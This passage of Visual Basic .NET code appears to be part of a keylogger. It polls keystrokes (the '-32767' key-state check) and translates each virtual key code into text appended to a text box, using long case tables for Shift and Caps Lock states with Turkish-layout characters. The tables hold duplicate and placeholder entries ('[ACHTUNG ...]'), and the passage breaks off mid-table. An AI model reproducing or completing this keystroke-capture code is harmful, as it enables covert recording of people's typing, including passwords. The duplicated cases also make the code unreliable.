            If typein = -32767 And My.Computer.Keyboard.ShiftKeyDown = True And My.Computer.Keyboard.AltKeyDown = False And My.Computer.Keyboard.CapsLock = False Then
                Select Case logger
                    Case 1
                        RichTextBox1.Text += ""
                    Case 2
                        RichTextBox1.Text += ""
                    Case 3
                        RichTextBox1.Text += "[ACHTUNG!!!]"
                    Case 4
                        RichTextBox1.Text += "[ACHTUNG!!!4]"
                    Case 5
                        RichTextBox1.Text += "[ACHTUNG!!!5]"
                    Case 6
                        RichTextBox1.Text += "[ACHTUNG!!6!]"
                    Case 7
                        RichTextBox1.Text += "[ACHTUNG!!!7]"
                    Case 8
                        RichTextBox1.Text += "[BackSpace]"
                    Case 9
                        RichTextBox1.Text += "[Tab]"
                    Case 10
                        RichTextBox1.Text += "[ACHTUNG!!!10]"
                    Case 11
                        RichTextBox1.Text += "[ACHTUNG!!!11]"
                    Case 12
                        RichTextBox1.Text += "[ACHTUNG!!!12]"
                    Case 13
                        RichTextBox1.Text += "[Enter]"
                    Case 112
                        RichTextBox1.Text += "[F1]"
                    Case 113
                        RichTextBox1.Text += "[F2]"
                    Case 114
                        RichTextBox1.Text += "[F3]"
                    Case 115
                        RichTextBox1.Text += "[F4]"
                    Case 116
                        RichTextBox1.Text += "[F5]"
                    Case 117
                        RichTextBox1.Text += "[F6]"
                    Case 118
                        RichTextBox1.Text += "[F7]"
                    Case 119
                        RichTextBox1.Text += "[F8]"
                    Case 120
                        RichTextBox1.Text += "[F9]"
                    Case 121
                        RichTextBox1.Text += "[F10]"
                    Case 122
                        RichTextBox1.Text += "[F11]"
                    Case 123
                        RichTextBox1.Text += "[F12]"

                    Case 160
                        RichTextBox1.Text += ""
                    Case 161
                        RichTextBox1.Text += ""

                    Case 164
                        RichTextBox1.Text += ""
                    Case 165
                        RichTextBox1.Text += "[Alt]"
                    Case 189
                        RichTextBox1.Text += "_"
                    Case 187
                        RichTextBox1.Text += "+"
                    Case 46
                        RichTextBox1.Text += "[Delete]"
                    Case 14
                        RichTextBox1.Text += "[ACHTUNG 14]"
                    Case 15
                        RichTextBox1.Text += "[ACHTUNG 15]"
                    Case 16
                        RichTextBox1.Text += ""
                    Case 17
                        RichTextBox1.Text += "[Ctrl]"
                    Case 18
                        RichTextBox1.Text += "[Alt]"
                    Case 19
                        RichTextBox1.Text += "[Pause-Break]"
                    Case 20
                        RichTextBox1.Text += "[Caps Lock]"
                    Case 21
                        RichTextBox1.Text += "[ACHTUNG 21]"
                    Case 22
                        RichTextBox1.Text += "[ACHTUNG 22]"
                    Case 23
                        RichTextBox1.Text += "[ACHTUNG 23]"
                    Case 24
                        RichTextBox1.Text += "[ACHTUNG 24]"
                    Case 25
                        RichTextBox1.Text += "[ACHTUNG 25]"
                    Case 26
                        RichTextBox1.Text += "[ACHTUNG 26]"
                    Case 27
                        RichTextBox1.Text += "[Esc]"
                    Case 28
                        RichTextBox1.Text += "[ACHTUNG 28]"
                    Case 29
                        RichTextBox1.Text += "[ACHTUNG 29]"
                    Case 30
                        RichTextBox1.Text += "[ACHTUNG 30]"
                    Case 31
                        RichTextBox1.Text += "[ACHTUNG 31]"
                    Case 32
                        RichTextBox1.Text += " "
                    Case 33
                        RichTextBox1.Text += "[PageUp]"
                    Case 34
                        RichTextBox1.Text += "[PageDown]"
                    Case 35
                        RichTextBox1.Text += "[End]"
                    Case 36
                        RichTextBox1.Text += "[Home]"
                    Case 37
                        RichTextBox1.Text += "[Left]"
                    Case 38
                        RichTextBox1.Text += "[Up]"
                    Case 39
                        RichTextBox1.Text += "[Right]"
                    Case 40
                        RichTextBox1.Text += "[Down]"
                    Case 41
                        RichTextBox1.Text += ")"
                    Case 42
                        RichTextBox1.Text += "*"
                    Case 43
                        RichTextBox1.Text += "+"
                    Case 44
                        RichTextBox1.Text += "[SS]"
                    Case 45
                        RichTextBox1.Text += "[INS]"
                    Case 47
                        RichTextBox1.Text += "/"
                    Case 48
                        RichTextBox1.Text += "="
                    Case 49
                        RichTextBox1.Text += "!"
                    Case 50
                        RichTextBox1.Text += "'"
                    Case 51
                        RichTextBox1.Text += "^"
                    Case 52
                        RichTextBox1.Text += "+"
                    Case 53
                        RichTextBox1.Text += "%"
                    Case 54
                        RichTextBox1.Text += "&"
                    Case 55
                        RichTextBox1.Text += "/"
                    Case 56
                        RichTextBox1.Text += "("
                    Case 57
                        RichTextBox1.Text += ")"
                    Case 58
                        RichTextBox1.Text += ":"
                    Case 59
                        RichTextBox1.Text += ";"
                    Case 60
                        RichTextBox1.Text += "<"
                    Case 61
                        RichTextBox1.Text += "="
                    Case 62
                        RichTextBox1.Text += ">"
                    Case 63
                        RichTextBox1.Text += "?"
                    Case 64
                        RichTextBox1.Text += "@"
                    Case 65
                        RichTextBox1.Text += "A"
                    Case 66
                        RichTextBox1.Text += "B"
                    Case 67
                        RichTextBox1.Text += "C"
                    Case 68
                        RichTextBox1.Text += "D"
                    Case 69
                        RichTextBox1.Text += "E"
                    Case 70
                        RichTextBox1.Text += "F"
                    Case 71
                        RichTextBox1.Text += "G"
                    Case 72
                        RichTextBox1.Text += "H"
                    Case 73
                        RichTextBox1.Text += "I"
                    Case 74
                        RichTextBox1.Text += "J"
                    Case 75
                        RichTextBox1.Text += "K"
                    Case 76
                        RichTextBox1.Text += "L"
                    Case 77
                        RichTextBox1.Text += "M"
                    Case 78
                        RichTextBox1.Text += "N"
                    Case 79
                        RichTextBox1.Text += "O"
                    Case 80
                        RichTextBox1.Text += "P"
                    Case 81
                        RichTextBox1.Text += "Q"
                    Case 82
                        RichTextBox1.Text += "R"
                    Case 83
                        RichTextBox1.Text += "S"
                    Case 84
                        RichTextBox1.Text += "T"
                    Case 85
                        RichTextBox1.Text += "U"
                    Case 86
                        RichTextBox1.Text += "V"
                    Case 87
                        RichTextBox1.Text += "W"
                    Case 88
                        RichTextBox1.Text += "X"
                    Case 89
                        RichTextBox1.Text += "Y"
                    Case 90
                        RichTextBox1.Text += "Z"
                    Case 91
                        RichTextBox1.Text += "[Win]"
                    Case 92
                        RichTextBox1.Text += "[Win]"
                    Case 93
                        RichTextBox1.Text += "[STT]"
                    Case 94
                        RichTextBox1.Text += "^"
                    Case 95
                        RichTextBox1.Text += "_"
                    Case 96
                        RichTextBox1.Text += "[num0]"
                    Case 97
                        RichTextBox1.Text += "[num1]"
                    Case 98
                        RichTextBox1.Text += "[num2]"
                    Case 99
                        RichTextBox1.Text += "[num3]"
                    Case 100
                        RichTextBox1.Text += "[num4]"
                    Case 101
                        RichTextBox1.Text += "[num5]"
                    Case 102
                        RichTextBox1.Text += "[num6]"
                    Case 103
                        RichTextBox1.Text += "[num7]"
                    Case 104
                        RichTextBox1.Text += "[num8]"
                    Case 105
                        RichTextBox1.Text += "[num9]"
                    Case 106
                        RichTextBox1.Text += "*"
                    Case 107
                        RichTextBox1.Text += "+"
                    Case 108
                        RichTextBox1.Text += "l"
                    Case 109
                        RichTextBox1.Text += "-"
                    Case 110
                        RichTextBox1.Text += ","
                    Case 111
                        RichTextBox1.Text += "/"
                    Case 112
                        RichTextBox1.Text += "P"
                    Case 113
                        RichTextBox1.Text += "Q"
                    Case 114
                        RichTextBox1.Text += "R"
                    Case 115
                        RichTextBox1.Text += "S"
                    Case 116
                        RichTextBox1.Text += "T"
                    Case 117
                        RichTextBox1.Text += "U"
                    Case 118
                        RichTextBox1.Text += "V"
                    Case 119
                        RichTextBox1.Text += "W"
                    Case 120
                        RichTextBox1.Text += "X"
                    Case 121
                        RichTextBox1.Text += "Y"
                    Case 122
                        RichTextBox1.Text += "Z"
                    Case 123
                        RichTextBox1.Text += "{"
                    Case 124
                        RichTextBox1.Text += "|"
                    Case 125
                        RichTextBox1.Text += "}"
                    Case 126
                        RichTextBox1.Text += "~"
                    Case 127
                        RichTextBox1.Text += "[ACHTUNG 127]"
                    Case 128
                        RichTextBox1.Text += "€"
                    Case 129
                        RichTextBox1.Text += "[ACHTUNG 129]"
                    Case 130
                        RichTextBox1.Text += "‚"
                    Case 131
                        RichTextBox1.Text += "ƒ"
                    Case 132
                        RichTextBox1.Text += "„"
                    Case 133
                        RichTextBox1.Text += "…"
                    Case 134
                        RichTextBox1.Text += "†"
                    Case 135
                        RichTextBox1.Text += "‡"
                    Case 136
                        RichTextBox1.Text += "ˆ"
                    Case 137
                        RichTextBox1.Text += "[ACHTUNG 137]"
                    Case 138
                        RichTextBox1.Text += "Š"
                    Case 139
                        RichTextBox1.Text += "‹"
                    Case 140
                        RichTextBox1.Text += "[ACHTUNG 140]"
                    Case 141
                        RichTextBox1.Text += "[ACHTUNG 141]"
                    Case 142
                        RichTextBox1.Text += "Z"
                    Case 143
                        RichTextBox1.Text += "[ACHTUNG 143]"
                    Case 144
                        RichTextBox1.Text += "[Num-Lock]"
                    Case 145
                        RichTextBox1.Text += "[Scroll-Lock]"
                    Case 146
                        RichTextBox1.Text += "’"
                    Case 147
                        RichTextBox1.Text += """"
                    Case 148
                        RichTextBox1.Text += """"
                    Case 149
                        RichTextBox1.Text += "•"
                    Case 150
                        RichTextBox1.Text += "–"
                    Case 151
                        RichTextBox1.Text += "—"
                    Case 152
                        RichTextBox1.Text += "˜"
                    Case 153
                        RichTextBox1.Text += "™"
                    Case 154
                        RichTextBox1.Text += "š"
                    Case 155
                        RichTextBox1.Text += "›"
                    Case 156
                        RichTextBox1.Text += "[ACHTUNG 155]"
                    Case 157
                        RichTextBox1.Text += "[ACHTUNG 157]"
                    Case 158
                        RichTextBox1.Text += "z"
                    Case 159
                        RichTextBox1.Text += "Ÿ"
                    Case 160
                        RichTextBox1.Text += "[ACHTUNG 160]"
                    Case 161
                        RichTextBox1.Text += "¡"
                    Case 162
                        RichTextBox1.Text += ""
                    Case 163
                        RichTextBox1.Text += ""
                    Case 164
                        RichTextBox1.Text += "¤"
                    Case 166
                        RichTextBox1.Text += "¦"
                    Case 167
                        RichTextBox1.Text += "§"
                    Case 168
                        RichTextBox1.Text += "¨"
                    Case 169
                        RichTextBox1.Text += "©"
                    Case 170
                        RichTextBox1.Text += "ª"
                    Case 171
                        RichTextBox1.Text += "«"
                    Case 172
                        RichTextBox1.Text += "¬"
                    Case 173
                        RichTextBox1.Text += "[ACHTUNG 173]"
                    Case 174
                        RichTextBox1.Text += "®"
                    Case 175
                        RichTextBox1.Text += "¯"
                    Case 176
                        RichTextBox1.Text += "°"
                    Case 177
                        RichTextBox1.Text += "±"
                    Case 178
                        RichTextBox1.Text += "²"
                    Case 179
                        RichTextBox1.Text += "³"
                    Case 180
                        RichTextBox1.Text += "´"
                    Case 181
                        RichTextBox1.Text += "µ"
                    Case 182
                        RichTextBox1.Text += "[ACHTUNG 182]"
                    Case 183
                        RichTextBox1.Text += ""
                    Case 184
                        RichTextBox1.Text += ""
                    Case 185
                        RichTextBox1.Text += "¹"
                    Case 186
                        RichTextBox1.Text += "Ş"
                    Case 187
                        RichTextBox1.Text += "»"
                    Case 188
                        RichTextBox1.Text += ";"
                    Case 189
                        RichTextBox1.Text += ":"
                    Case 190
                        RichTextBox1.Text += ":"
                    Case 191
                        RichTextBox1.Text += "Ö"
                    Case 192
                        RichTextBox1.Text += "é"
                    Case 193
                        RichTextBox1.Text += "Á"
                    Case 194
                        RichTextBox1.Text += "Â"
                    Case 195
                        RichTextBox1.Text += "Ã"
                    Case 196
                        RichTextBox1.Text += "Ä"
                    Case 197
                        RichTextBox1.Text += "Æ"
                    Case 198
                        RichTextBox1.Text += "Ç"
                    Case 199
                        RichTextBox1.Text += "È"
                    Case 200
                        RichTextBox1.Text += "É"
                    Case 201
                        RichTextBox1.Text += "Ê"
                    Case 202
                        RichTextBox1.Text += "Ë"
                    Case 203
                        RichTextBox1.Text += "Ì"
                    Case 204
                        RichTextBox1.Text += "Í"
                    Case 205
                        RichTextBox1.Text += "Í"
                    Case 206
                        RichTextBox1.Text += "Î"
                    Case 207
                        RichTextBox1.Text += "Ï"
                    Case 208
                        RichTextBox1.Text += "Ğ"
                    Case 209
                        RichTextBox1.Text += "Ñ"
                    Case 210
                        RichTextBox1.Text += "Ò"
                    Case 211
                        RichTextBox1.Text += "Ó"
                    Case 212
                        RichTextBox1.Text += "Ô"
                    Case 213
                        RichTextBox1.Text += "Õ"
                    Case 214
                        RichTextBox1.Text += "Ö"
                    Case 215
                        RichTextBox1.Text += "×"
                    Case 216
                        RichTextBox1.Text += "Ø"
                    Case 217
                        RichTextBox1.Text += "Ù"
                    Case 218
                        RichTextBox1.Text += "Ú"
                    Case 219
                        RichTextBox1.Text += "Ğ"
                    Case 220
                        RichTextBox1.Text += "Ç"
                    Case 221
                        RichTextBox1.Text += "Ü"
                    Case 222
                        RichTextBox1.Text += "İ"
                    Case 223
                        RichTextBox1.Text += "?"
                    Case 224
                        RichTextBox1.Text += "à"
                    Case 225
                        RichTextBox1.Text += "á"
                    Case 226
                        RichTextBox1.Text += "â"
                    Case 227
                        RichTextBox1.Text += "<"
                    Case 228
                        RichTextBox1.Text += "ä"
                    Case 229
                        RichTextBox1.Text += "æ"
                    Case 230
                        RichTextBox1.Text += "Ç"
                    Case 231
                        RichTextBox1.Text += "è"
                    Case 232
                        RichTextBox1.Text += "é"
                    Case 233
                        RichTextBox1.Text += "ê"
                    Case 234
                        RichTextBox1.Text += "ë"
                    Case 235
                        RichTextBox1.Text += "ì"
                    Case 236
                        RichTextBox1.Text += "í"
                    Case 237
                        RichTextBox1.Text += "í"
                    Case 238
                        RichTextBox1.Text += "î"
                    Case 239
                        RichTextBox1.Text += "ï"
                    Case 240
                        RichTextBox1.Text += "ğ"
                    Case 241
                        RichTextBox1.Text += "ñ"
                    Case 242
                        RichTextBox1.Text += "ò"
                    Case 243
                        RichTextBox1.Text += "ó"
                    Case 244
                        RichTextBox1.Text += "ô"
                    Case 245
                        RichTextBox1.Text += "õ"
                    Case 246
                        RichTextBox1.Text += "Ö"
                    Case 247
                        RichTextBox1.Text += "÷"
                    Case 248
                        RichTextBox1.Text += "ø"
                    Case 249
                        RichTextBox1.Text += "ù"
                    Case 250
                        RichTextBox1.Text += "ú"
                    Case 251
                        RichTextBox1.Text += "û"
                    Case 252
                        RichTextBox1.Text += "ü"
                    Case 253
                        RichTextBox1.Text += "ı"
                    Case 254
                        RichTextBox1.Text += "Ş"
                    Case 255
                        RichTextBox1.Text += "ÿ"
                    Case Else
                        RichTextBox1.Text += Chr(logger).ToString
                End Select
            End If
            If typein = -32767 And My.Computer.Keyboard.ShiftKeyDown = True And My.Computer.Keyboard.AltKeyDown = False And My.Computer.Keyboard.CapsLock = True Then
                Select Case logger
                    Case 1
                        RichTextBox1.Text += ""
                    Case 2
                        RichTextBox1.Text += ""
                    Case 3
                        RichTextBox1.Text += "[ACHTUNG!!!]"
                    Case 4
                        RichTextBox1.Text += "[ACHTUNG!!!4]"
                    Case 5
                        RichTextBox1.Text += "[ACHTUNG!!!5]"
                    Case 6
                        RichTextBox1.Text += "[ACHTUNG!!6!]"
                    Case 7
                        RichTextBox1.Text += "[ACHTUNG!!!7]"
                    Case 8
                        RichTextBox1.Text += "[BackSpace]"
                    Case 9
                        RichTextBox1.Text += "[Tab]"
                    Case 10
                        RichTextBox1.Text += "[ACHTUNG!!!10]"
                    Case 11
                        RichTextBox1.Text += "[ACHTUNG!!!11]"
                    Case 12
                        RichTextBox1.Text += "[ACHTUNG!!!12]"
                    Case 13
                        RichTextBox1.Text += "[Enter]"
                    Case 112
                        RichTextBox1.Text += "[F1]"
                    Case 113
                        RichTextBox1.Text += "[F2]"
                    Case 114
                        RichTextBox1.Text += "[F3]"
                    Case 115
                        RichTextBox1.Text += "[F4]"
                    Case 116
                        RichTextBox1.Text += "[F5]"
                    Case 117
                        RichTextBox1.Text += "[F6]"
                    Case 118
                        RichTextBox1.Text += "[F7]"
                    Case 119
                        RichTextBox1.Text += "[F8]"
                    Case 120
                        RichTextBox1.Text += "[F9]"
                    Case 121
                        RichTextBox1.Text += "[F10]"
                    Case 122
                        RichTextBox1.Text += "[F11]"
                    Case 123
                        RichTextBox1.Text += "[F12]"

                    Case 160
                        RichTextBox1.Text += ""
                    Case 161
                        RichTextBox1.Text += ""

                    Case 164
                        RichTextBox1.Text += ""
                    Case 165
                        RichTextBox1.Text += "[Alt]"
                    Case 189
                        RichTextBox1.Text += "_"
                    Case 187
                        RichTextBox1.Text += "+"
                    Case 46
                        RichTextBox1.Text += "[Delete]"
                    Case 14
                        RichTextBox1.Text += "[ACHTUNG 14]"
                    Case 15
                        RichTextBox1.Text += "[ACHTUNG 15]"
                    Case 16
                        RichTextBox1.Text += ""
                    Case 17
                        RichTextBox1.Text += "[Ctrl]"
                    Case 18
                        RichTextBox1.Text += "[Alt]"
                    Case 19
                        RichTextBox1.Text += "[Pause-Break]"
                    Case 20
                        RichTextBox1.Text += "[Caps Lock]"
                    Case 21
                        RichTextBox1.Text += "[ACHTUNG 21]"
                    Case 22
                        RichTextBox1.Text += "[ACHTUNG 22]"
                    Case 23
                        RichTextBox1.Text += "[ACHTUNG 23]"
                    Case 24
                        RichTextBox1.Text += "[ACHTUNG 24]"
                    Case 25
                        RichTextBox1.Text += "[ACHTUNG 25]"
                    Case 26
                        RichTextBox1.Text += "[ACHTUNG 26]"
                    Case 27
                        RichTextBox1.Text += "[Esc]"
                    Case 28
                        RichTextBox1.Text += "[ACHTUNG 28]"
                    Case 29
                        RichTextBox1.Text += "[ACHTUNG 29]"
                    Case 30
                        RichTextBox1.Text += "[ACHTUNG 30]"
                    Case 31
                        RichTextBox1.Text += "[ACHTUNG 31]"
                    Case 32
                        RichTextBox1.Text += " "
                    Case 33
                        RichTextBox1.Text += "[PageUp]"
                    Case 34
                        RichTextBox1.Text += "[PageDown]"
                    Case 35
                        RichTextBox1.Text += "[End]"
                    Case 36
                        RichTextBox1.Text += "[Home]"
                    Case 37
                        RichTextBox1.Text += "[Left]"
                    Case 38
                        RichTextBox1.Text += "[Up]"
                    Case 39
                        RichTextBox1.Text += "[Right]"
                    Case 40
                        RichTextBox1.Text += "[Down]"
                    Case 41
                        RichTextBox1.Text += ")"
                    Case 42
                        RichTextBox1.Text += "*"
                    Case 43
                        RichTextBox1.Text += "+"
                    Case 44
                        RichTextBox1.Text += "[SS]"
                    Case 45
                        RichTextBox1.Text += "[INS]"
                    Case 47
                        RichTextBox1.Text += "/"
                    Case 48
                        RichTextBox1.Text += "="
                    Case 49
                        RichTextBox1.Text += "!"
                    Case 50
                        RichTextBox1.Text += "'"
                    Case 51
                        RichTextBox1.Text += "^"
                    Case 52
                        RichTextBox1.Text += "+"
                    Case 53
                        RichTextBox1.Text += "%"
                    Case 54
                        RichTextBox1.Text += "&"
                    Case 55
                        RichTextBox1.Text += "/"
                    Case 56
                        RichTextBox1.Text += "("
                    Case 57
                        RichTextBox1.Text += ")"
                    Case 58
                        RichTextBox1.Text += ":"
                    Case 59
                        RichTextBox1.Text += ";"
                    Case 60
                        RichTextBox1.Text += "<"
                    Case 61
                        RichTextBox1.Text += "="
                    Case 62
                        RichTextBox1.Text += ">"
                    Case 63
                        RichTextBox1.Text += "?"
                    Case 64
                        RichTextBox1.Text += "@"
                    Case 65
                        RichTextBox1.Text += "a"
                    Case 66
                        RichTextBox1.Text += "b"
                    Case 67
                        RichTextBox1.Text += "c"
                    Case 68
                        RichTextBox1.Text += "d"
                    Case 69
                        RichTextBox1.Text += "e"
                    Case 70
                        RichTextBox1.Text += "f"
                    Case 71
                        RichTextBox1.Text += "g"
                    Case 72
                        RichTextBox1.Text += "h"
                    Case 73
                        RichTextBox1.Text += "ı"
                    Case 74
                        RichTextBox1.Text += "j"
                    Case 75
                        RichTextBox1.Text += "k"
                    Case 76
                        RichTextBox1.Text += "l"
                    Case 77
                        RichTextBox1.Text += "m"
                    Case 78
                        RichTextBox1.Text += "n"
                    Case 79
                        RichTextBox1.Text += "o"
                    Case 80
                        RichTextBox1.Text += "p"
                    Case 81
                        RichTextBox1.Text += "q"
                    Case 82
                        RichTextBox1.Text += "r"
                    Case 83
                        RichTextBox1.Text += "s"
                    Case 84
                        RichTextBox1.Text += "t"
                    Case 85
                        RichTextBox1.Text += "u"
                    Case 86
                        RichTextBox1.Text += "v"
                    Case 87
                        RichTextBox1.Text += "w"
                    Case 88
                        RichTextBox1.Text += "x"
                    Case 89
                        RichTextBox1.Text += "y"
                    Case 90
                        RichTextBox1.Text += "z"
                    Case 91
                        RichTextBox1.Text += "[Win]"
                    Case 92
                        RichTextBox1.Text += "[Win]"
                    Case 93
                        RichTextBox1.Text += "[STT]"
                    Case 94
                        RichTextBox1.Text += "^"
                    Case 95
                        RichTextBox1.Text += "_"
                    Case 96
                        RichTextBox1.Text += "[num0]"
                    Case 97
                        RichTextBox1.Text += "[num1]"
                    Case 98
                        RichTextBox1.Text += "[num2]"
                    Case 99
                        RichTextBox1.Text += "[num3]"
                    Case 100
                        RichTextBox1.Text += "[num4]"
                    Case 101
                        RichTextBox1.Text += "[num5]"
                    Case 102
                        RichTextBox1.Text += "[num6]"
                    Case 103
                        RichTextBox1.Text += "[num7]"
                    Case 104
                        RichTextBox1.Text += "[num8]"
                    Case 105
                        RichTextBox1.Text += "[num9]"
                    Case 106
                        RichTextBox1.Text += "*"
                    Case 107
                        RichTextBox1.Text += "+"
                    Case 108
                        RichTextBox1.Text += "l"
                    Case 109
                        RichTextBox1.Text += "-"
                    Case 110
                        RichTextBox1.Text += ","
                    Case 111
                        RichTextBox1.Text += "/"
                    Case 112
                        RichTextBox1.Text += "p"
                    Case 113
                        RichTextBox1.Text += "q"
                    Case 114
                        RichTextBox1.Text += "r"
                    Case 115
                        RichTextBox1.Text += "s"
                    Case 116
                        RichTextBox1.Text += "t"
                    Case 117
                        RichTextBox1.Text += "u"
                    Case 118
                        RichTextBox1.Text += "v"
                    Case 119
                        RichTextBox1.Text += "w"
                    Case 120
                        RichTextBox1.Text += "x"
                    Case 121
                        RichTextBox1.Text += "y"
                    Case 122
                        RichTextBox1.Text += "z"
                    Case 123
                        RichTextBox1.Text += "{"
                    Case 124
                        RichTextBox1.Text += "|"
                    Case 125
                        RichTextBox1.Text += "}"
                    Case 126
                        RichTextBox1.Text += "~"
                    Case 127
                        RichTextBox1.Text += "[ACHTUNG 127]"
                    Case 128
                        RichTextBox1.Text += "€"
                    Case 129
                        RichTextBox1.Text += "[ACHTUNG 129]"
                    Case 130
                        RichTextBox1.Text += "‚"
                    Case 131
                        RichTextBox1.Text += "ƒ"
                    Case 132
                        RichTextBox1.Text += "„"
                    Case 133
                        RichTextBox1.Text += "…"
                    Case 134
                        RichTextBox1.Text += "†"
                    Case 135
                        RichTextBox1.Text += "‡"
                    Case 136
                        RichTextBox1.Text += "ˆ"
                    Case 137
                        RichTextBox1.Text += "[ACHTUNG 137]"
                    Case 138
                        RichTextBox1.Text += "Š"
                    Case 139
                        RichTextBox1.Text += "‹"
                    Case 140
                        RichTextBox1.Text += "[ACHTUNG 140]"
                    Case 141
                        RichTextBox1.Text += "[ACHTUNG 141]"
                    Case 142
                        RichTextBox1.Text += "Z"
                    Case 143
                        RichTextBox1.Text += "[ACHTUNG 143]"
                    Case 144
                        RichTextBox1.Text += "[Num-Lock]"
                    Case 145
                        RichTextBox1.Text += "[Scroll-Lock]"
                    Case 146
                        RichTextBox1.Text += "’"
                    Case 147
                        RichTextBox1.Text += """"
                    Case 148
                        RichTextBox1.Text += """"
                    Case 149
                        RichTextBox1.Text += "•"
                    Case 150
                        RichTextBox1.Text += "–"
                    Case 151
                        RichTextBox1.Text += "—"
                    Case 152
                        RichTextBox1.Text += "˜"
                    Case 153
                        RichTextBox1.Text += "™"
                    Case 154
                        RichTextBox1.Text += "š"
                    Case 155
                        RichTextBox1.Text += "›"
                    Case 156
                        RichTextBox1.Text += "[ACHTUNG 155]"
                    Case 157
                        RichTextBox1.Text += "[ACHTUNG 157]"
                    Case 158
                        RichTextBox1.Text += "z"
                    Case 159
                        RichTextBox1.Text += "Ÿ"
                    Case 160
                        RichTextBox1.Text += "[ACHTUNG 160]"
                    Case 161
                        RichTextBox1.Text += "¡"
                    Case 162
                        RichTextBox1.Text += ""
                    Case 163
                        RichTextBox1.Text += ""
                    Case 164
                        RichTextBox1.Text += "¤"
                    Case 166
                        RichTextBox1.Text += "¦"
                    Case 167
                        RichTextBox1.Text += "§"
                    Case 168
                        RichTextBox1.Text += "¨"
                    Case 169
                        RichTextBox1.Text += "©"
                    Case 170
                        RichTextBox1.Text += "ª"
                    Case 171
                        RichTextBox1.Text += "«"
                    Case 172
                        RichTextBox1.Text += "¬"
                    Case 173
                        RichTextBox1.Text += "[ACHTUNG 173]"
                    Case 174
                        RichTextBox1.Text += "®"
                    Case 175
                        RichTextBox1.Text += "¯"
                    Case 176
                        RichTextBox1.Text += "°"
                    Case 177
                        RichTextBox1.Text += "±"
                    Case 178
                        RichTextBox1.Text += "²"
                    Case 179
                        RichTextBox1.Text += "³"
                    Case 180
                        RichTextBox1.Text += "´"
                    Case 181
                        RichTextBox1.Text += "µ"
                    Case 182
                        RichTextBox1.Text += "[ACHTUNG 182]"
                    Case 183
                        RichTextBox1.Text += ""
                    Case 184
                        RichTextBox1.Text += ""
                    Case 185
                        RichTextBox1.Text += "¹"
                    Case 186
                        RichTextBox1.Text += "ş"
                    Case 187
                        RichTextBox1.Text += "»"
                    Case 188
                        RichTextBox1.Text += ";"
                    Case 189
                        RichTextBox1.Text += ":"
                    Case 190
                        RichTextBox1.Text += ":"
                    Case 191
                        RichTextBox1.Text += "Ö"
                    Case 192
                        RichTextBox1.Text += "é"
                    Case 193
                        RichTextBox1.Text += "Á"
                    Case 194
                        RichTextBox1.Text += "Â"
                    Case 195
                        RichTextBox1.Text += "Ã"
                    Case 196
                        RichTextBox1.Text += "Ä"
                    Case 197
                        RichTextBox1.Text += "Æ"
                    Case 198
                        RichTextBox1.Text += "Ç"
                    Case 199
                        RichTextBox1.Text += "È"
                    Case 200
                        RichTextBox1.Text += "É"
                    Case 201
                        RichTextBox1.Text += "Ê"
                    Case 202
                        RichTextBox1.Text += "Ë"
                    Case 203
                        RichTextBox1.Text += "Ì"
                    Case 204
                        RichTextBox1.Text += "Í"
                    Case 205
                        RichTextBox1.Text += "Í"
                    Case 206
                        RichTextBox1.Text += "Î"
                    Case 207
                        RichTextBox1.Text += "Ï"
                    Case 208
                        RichTextBox1.Text += "ğ"
                    Case 209
                        RichTextBox1.Text += "Ñ"
                    Case 210
                        RichTextBox1.Text += "Ò"
                    Case 211
                        RichTextBox1.Text += "Ó"
                    Case 212
                        RichTextBox1.Text += "Ô"
                    Case 213
                        RichTextBox1.Text += "Õ"
                    Case 214
                        RichTextBox1.Text += "ö"
                    Case 215
                        RichTextBox1.Text += "×"
                    Case 216
                        RichTextBox1.Text += "Ø"
                    Case 217
                        RichTextBox1.Text += "Ù"
                    Case 218
                        RichTextBox1.Text += "Ú"
                    Case 219
                        RichTextBox1.Text += "Ğ"
                    Case 220
                        RichTextBox1.Text += "ç"
                    Case 221
                        RichTextBox1.Text += "ü"
                    Case 222
                        RichTextBox1.Text += "i"
                    Case 223
                        RichTextBox1.Text += "?"
                    Case 224
                        RichTextBox1.Text += "à"
                    Case 225
                        RichTextBox1.Text += "á"
                    Case 226
                        RichTextBox1.Text += "â"
                    Case 227
                        RichTextBox1.Text += "<"
                    Case 228
                        RichTextBox1.Text += "ä"
                    Case 229
                        RichTextBox1.Text += "æ"
                    Case 230
                        RichTextBox1.Text += "Ç"
                    Case 231
                        RichTextBox1.Text += "è"
                    Case 232
                        RichTextBox1.Text += "é"
                    Case 233
                        RichTextBox1.Text += "ê"
                    Case 234
                        RichTextBox1.Text += "ë"
                    Case 235
                        RichTextBox1.Text += "ì"
                    Case 236
                        RichTextBox1.Text += "í"
                    Case 237
                        RichTextBox1.Text += "í"
                    Case 238
                        RichTextBox1.Text += "î"
                    Case 239
                        RichTextBox1.Text += "ï"
                    Case 240
                        RichTextBox1.Text += "ğ"
                    Case 241
                        RichTextBox1.Text += "ñ"
                    Case 242
                        RichTextBox1.Text += "ò"
                    Case 243
                        RichTextBox1.Text += "ó"
                    Case 244
                        RichTextBox1.Text += "ô"
                    Case 245
                        RichTextBox1.Text += "õ"
                    Case 246
                        RichTextBox1.Text += "Ö"
                    Case 247
                        RichTextBox1.Text += "÷"
                    Case 248
                        RichTextBox1.Text += "ø"
                    Case 249
                        RichTextBox1.Text += "ù"
                    Case 250
                        RichTextBox1.Text += "ú"
                    Case 251
                        RichTextBox1.Text += "û"
                    Case 252
                        RichTextBox1.Text += "ü"
                    Case 253
                        RichTextBox1.Text += "ı"
                    Case 254
                        RichTextBox1.Text += "Ş"
                    Case 255
                        RichTextBox1.Text += "ÿ"
                    Case Else
                        RichTextBox1.Text += Chr(logger).ToString
                End Select

            End If
            If typein = -32767 And My.Computer.Keyboard.CapsLock = True And My.Computer.Keyboard.AltKeyDown = False And My.Computer.Keyboard.ShiftKeyDown = False Then
                Select Case logger
                    Case 1
                        RichTextBox1.Text += ""
                    Case 2
                        RichTextBox1.Text += ""
                    Case 3
                        RichTextBox1.Text += "[ACHTUNG!!!]"
                    Case 4
                        RichTextBox1.Text += ""
                    Case 5
                        RichTextBox1.Text += "[ACHTUNG!!!5]"
                    Case 6
                        RichTextBox1.Text += "[ACHTUNG!!6!]"
                    Case 7
                        RichTextBox1.Text += "[ACHTUNG!!!7]"
                    Case 8
                        RichTextBox1.Text += "[BackSpace]"
                    Case 9
                        RichTextBox1.Text += "[Tab]"
                    Case 10
                        RichTextBox1.Text += "[ACHTUNG!!!10]"
                    Case 11
                        RichTextBox1.Text += "[ACHTUNG!!!11]"
                    Case 12
                        RichTextBox1.Text += ""
                    Case 13
                        RichTextBox1.Text += "[Enter]"
                    Case 112
                        RichTextBox1.Text += "[F1]"
